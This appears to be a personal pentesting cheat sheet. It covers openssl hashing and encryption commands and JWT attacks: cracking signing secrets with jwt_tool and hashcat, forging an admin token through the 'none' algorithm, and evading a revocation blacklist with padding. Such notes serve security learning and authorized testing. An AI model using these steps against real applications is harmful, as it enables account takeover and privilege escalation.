# Hash
- Crack using Rainbow tables in
  - https://www.cmd5.org/
  - https://crackstation.net/
- MD5
  - `-n`: prevent to add Enter at the end of the string.
  ```bash
  echo -n "Yashar" | openssl md5     
  ```

# Encode
- Base64
  ```bash
  echo -n "Yashar" | openssl enc -base64       
  ```

# Encryption
- Symmetric (AES256 )
  ```bash
  echo -n "Yashar" | openssl enc -e -aes256 -a -iter 123                                        # Encrypt
  echo U2FsdGVkX1+N3KALNWjhJbif5JfLOlLam/0Ym8OfyPk= | openssl enc -d -aes256 -a -iter 123       # Decrypt
  ```
- Asymmetric (RSA)
  ```bash
  openssl genrsa -out yashar_private.pem 2048                                                   # Generate Private-key
  openssl rsa -in yashar_private.pem -pubout > yashar_public.pem                                # Generate Public-key
  openssl rsautl -encrypt -inkey alice_public.pem -pubin -in secret.txt -out top_secret.enc     # Encrypt
  openssl rsautl -decrypt -inkey alice_private.pem -in top_secret.enc                           # Decrypt
  ```

# JWT 
### Crack the secret key
- We need secret key to re-encrypt the modified jwt token (`role: admin`) in *https://jwt.io/*.
  ```bash
  cookiemonster -cookie "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o"
  python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1NTc2M2Q4ZjYxZTM0YWVkYjJlMzMzMCIsImlhdCI6MTcwMDIyNjAwOSwiZXhwIjoxNzAwNDg1MjA5fQ.0uHmgT3rFR593NEH3sO92_oHieJECQD0-OEfFzfWDyE -d ~/Desktop/wl -C
  hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
  ```

### bypass
- Unverified signature
  - Modify JWT in *Inspector* of BurpSuite Repeater, if there is no check for signature, it will be bypassed.
- Change algorithm to `none`:
  - jwt: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`
    - Header: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9` → `{"typ":"JWT","alg":"HS256"}` → `{"typ":"JWT","alg":"none"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=`
    - Payload: `eyJ1c2VybmFtZSI6Imd1ZXN0In0` → `eyJ1c2VybmFtZSI6Imd1ZXN0In0=` → `{"username":"guest"}` → `{"username":"admin"}` → `eyJ1c2VybmFtZSI6ImFkbWluIn0=`
    - Signature: `OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk` → remove
  - modified jwt: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0`
- Token revoke
  - Use padding (`=`) at the end of jwt token, to bypass blacklist of tokens.

### Tip
- By narrow recon in JavaScript files, we can find an endpoint that create ID of admin based on his email. If we have the secret_key, we are able to re-cncrypt the modified jwt.


# Resource
- https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
